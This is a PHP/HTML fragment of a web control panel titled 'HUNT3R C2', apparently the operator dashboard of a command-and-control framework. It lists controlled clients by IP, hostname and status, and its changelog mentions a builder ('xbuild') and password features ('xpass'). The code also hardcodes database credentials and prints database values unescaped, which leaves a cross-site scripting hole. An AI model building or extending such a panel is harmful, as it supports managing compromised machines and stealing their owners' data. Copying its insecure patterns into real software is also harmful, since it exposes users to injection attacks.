<div class="left-pane">
    <h3>Clients</h3>
    <div class="leftmain-pane">
    <table>
	<thead>
            <tr>
                <th>xClientID</th>
                <th>IPv4</th>
                <th>Nickname</th>
                <th>Hostname</th>
                <th>Status</th>
                <th>Options</th>
            </tr>
        </thead>
        <tbody>
            <?php
                $pdo = new PDO('mysql:host=localhost;dbname=clients', 'hunt3r', 'hunt3r');

                $stmt = $pdo->prepare('SELECT xid, ip, nickname, hostname, status FROM xclients');
                $stmt->execute();
                $clients = $stmt->fetchAll(PDO::FETCH_ASSOC);

                foreach ($clients as $client) {
                    echo '<tr class="client-row" data-xid="' . $client['xid'] . '">';
                    echo '<td>' . $client['xid'] . '</td>';
                    echo '<td>' . $client['ip'] . '</td>';
                    echo '<td>' . $client['nickname'] . '</td>';
                    echo '<td>' . $client['hostname'] . '</td>';
                    echo '<td class="status-' . strtolower($client['status']) . '">' . $client['status'] . '</td>';
                    echo '<td><form method="post" action="">'; // Kein Ziel angegeben
                    echo '<input type="hidden" name="xid" value="' . $client['xid'] . '">';
                    echo '<button type="submit" name="deleteButton" value="1" class="delete-button">Delete</button>';
                    echo '</form></td>';
                    echo '</tr>';
                }
            ?>
        </tbody>
    </table>
    </div>
</div>
<div class="right-pane" id="right-pane">
    <h3>HUNT3R C2</h3>
    <div class="rightmain-pane">
    <div class="info-container"><br><br>
    <p>Current Version: ALPHA 1.02</p><br>
    <div class="update-info">
        <h3>Last Updates/Fixes</h3>
        <table>
            <tr><td>xbuild rework</td></tr>
            <tr><td>xbuild build tabs</td></tr>
            <tr><td>xpass added</td></tr>
            <tr><td>xpass_info added</td></tr>
            <tr><td>CSS designs updated</td></tr>
        </table>
    </div>
    <div class="update-info">
        <h3>Upcoming Updates</h3>
        <table>
            <tr><td>CSS Structure rework</td></tr>
            <tr><td>CSS Optimization</td></tr>
            <tr><td>C2 Web Installer</td></tr>
            <tr><td>XCHAT</td></tr>
            <tr><td>XTEAM</td></tr>
            <tr><td>Light- darkmode (recolor settings)</td></tr>
        </table>
    </div><br><br><br><br><br><br><br><br><br>

    <p>For More Information Or Troubleshooting, Please Have a Look at Our <a href="documentation_link">Documentation</a>.</p>
    <p>Visit The Official <a href="https://google.com/">R4IN Security Website</a>.</p>
</div>
</div>
</div>